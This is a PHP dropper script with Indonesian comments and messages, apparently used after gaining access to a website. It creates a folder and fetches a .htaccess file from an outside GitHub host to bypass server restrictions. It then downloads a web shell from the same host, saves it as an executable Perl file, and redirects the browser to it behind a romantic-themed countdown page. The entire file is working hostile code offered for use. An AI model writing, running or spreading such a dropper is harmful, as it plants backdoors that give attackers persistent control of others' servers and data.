<?php

echo "<font color=lime>";
$dir = "muach";
@mkdir($dir);
if($dir){
    echo "<center><h1><br>Biarkan Aku Masuk Didalam Hatimu<br><br> ==================== ";
} else {
    echo "<br> [-] Error !";
}
// BAYPASE HTACCES
    $dihianati = "https://raw.githubusercontent.com/antoniola/rejeki/master/hlop.txt";
    $file = file_get_contents($dihianati);
    $open = fopen("muach/.htaccess" , 'w');
    fwrite($open,$file);
    fclose($open);
     if($open) {
         echo "<br> Prosses Membuka Hati";
     } else {
         echo "<br>[-] Error !";
     }

// SHELLNYA
    $sedih = "https://raw.githubusercontent.com/antoniola/rejeki/master/x0x0x0xx0x0xd93f517.php";
    $file2 = file_get_contents($sedih);
    $open = fopen("muach/love.pl" , 'w');
	chmod("muach/love.pl",0755);
    fwrite($open,$file2);
    fclose($open);
     if($open) {
         echo "<br> ==================== ";
		 
echo "<script type=\"text/JavaScript\">\n"; 
echo "<!--\n"; 
echo "function eventualRedirect(redirectTo, timeoutPeriod) {\n"; 
echo "setTimeout(\"location.href = redirectTo;\",timeoutPeriod);\n"; 
echo "}\n"; 
echo "\n"; 
echo "setTimeout(\"location.href = './muach/love.pl';\",3000);\n"; 
echo "-->\n"; 
echo "</script>\n"; 
echo "\n"; 
echo "<body>\n"; 
echo "<br>\n"; 
echo "<center>\n"; 
echo "<img src='https://raw.githubusercontent.com/antoniola/rejeki/master/loadingku.gif' border='0' width='720' height='450'><br>Tunggu <script type=\"text/javascript\">\n"; 
echo "\n"; 
echo "// KONFIGURASI\n"; 
echo "var menit = 1; // Lamanya hitung mundur (dalam menit)\n"; 
echo "var detik = 4; // Detik standar (jangan diubah kecuali Anda tahu yang Anda lakukan)\n"; 
echo "var penghitung_detik = detik; // Set variabel detik yang lain untuk dimanipulasi\n"; 
echo "\n"; 
echo "// HITUNG MUNDUR\n"; 
echo "penghitung_detik = 0;\n"; 
echo "function hitung_mundur() {\n"; 
echo "penghitung_detik--; // Setiap siklus 1 detik mengurangi nilainya 1 poin\n"; 
echo "if (penghitung_detik == -1) { // Deteksi detik ketika nilainya \"0\"\n"; 
echo "menit--; // Setiap siklus 1 menit mengurangi nilainya 1 poin\n"; 
echo "penghitung_detik = detik; // Me-reset detik untuk memulai hitung mundur menit yang baru\n"; 
echo "if (menit <= -1) { // Hitung mundur selesai\n"; 
echo "menit = 0;penghitung_detik = 0; // Menset menit dan detik ke \"0\"\n"; 
echo "clearTimeout(penghitung); // Stop hitung mundur\n"; 
echo "}\n"; 
echo "}\n"; 
echo "if (document.getElementById) {\n"; 
echo "document.getElementById(\"hitung_mundur_tampil\").innerHTML=penghitung_detik; // Memasukkan nilai variabel menit dan detik untuk ditampilkan\n"; 
echo "}\n"; 
echo "penghitung=setTimeout(\"hitung_mundur()\", 1000); // Set siklus penghitungan mundur (standar: 1 detik)\n"; 
echo "}\n"; 
echo "\n"; 
echo "// INISIALISASI\n"; 
echo "if (document.all||document.getElementById)\n"; 
echo "document.write(' <b id=\"hitung_mundur_tampil\">'+penghitung_detik+' </b>'); // Format tampilan hitung mundur di antarmuka\n"; 
echo "hitung_mundur();\n"; 
echo "</script> Detik </font>\n";	
		 
		 
     } else {
         echo "<br>[-] Error !<br>Harus Upload Manual</center>";
		 echo "</h1></font>";
     }


?>
